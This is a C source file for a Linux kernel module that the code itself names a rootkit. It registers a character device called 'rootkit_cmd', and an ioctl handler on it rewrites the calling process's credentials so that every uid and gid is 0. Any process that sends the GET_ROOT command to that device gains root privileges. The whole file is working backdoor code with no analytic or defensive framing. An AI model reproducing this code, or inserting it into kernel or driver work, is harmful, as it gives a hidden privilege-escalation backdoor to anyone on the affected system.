#include "utils.h"

void get_root(void)
{
    struct cred *cred = prepare_creds();
    if (!cred)
        return;
    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    commit_creds(cred);
}

long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case GET_ROOT:
        get_root();
        break;
    default:
    }

    return 0;
}

struct file_operations fops = {.unlocked_ioctl = cmd_ioctl};

void utils_init()
{
    chrdev_add("rootkit_cmd", &fops);
}